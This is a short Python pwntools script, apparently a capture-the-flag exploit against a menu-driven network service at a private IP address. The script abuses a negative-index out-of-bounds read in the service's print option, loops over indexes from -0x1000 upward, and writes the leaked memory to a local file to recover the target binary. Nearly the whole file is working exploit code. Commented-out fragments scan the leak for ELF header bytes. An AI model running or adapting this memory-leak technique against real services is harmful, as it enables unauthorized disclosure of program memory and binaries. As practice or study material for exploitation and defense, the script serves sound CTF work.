from pwn import *
p = remote('172.16.6.6',10001)
context.log_level='debug'
def store(content):
	p.sendlineafter('>>','1')
	p.sendline(content)
def prin(idx):
	p.sendlineafter('>>','2')
	p.sendlineafter('Index: ',str(idx))
def edit(idx,content):
	p.sendlineafter('>>','3')
	p.sendlineafter('Index: ',str(idx))
	p.sendline(content)
'''
store('4541510')
prin(0)
data = p.recvline()[:-1]
if "invalid index" not in data:
	data = hex(int(data))
	print data
'''
f = open('pwn2','wb')
i = -0x1000
while(i<0):
	prin(i)
	tmp = p.recvline()[:-1]
	if "invalid index" not in tmp and tmp!='-1':
		a = p64(int(tmp)).ljust(8,'\x00')
		print a
		f.write(a)
		'''
		data = hex(int(tmp))
		print data
 		if '45' in data and '4c' in data and '46' in data:
			log.info(str(i)+":"+data)
			break;
		'''
	i+=1
'''
	if "invalid index" in data:
		f.write(p64(0))
	else:
		data = data.ljust(8,'\x00')
		print data
		f.write(data)
'''
f.close()
		
p.interactive()
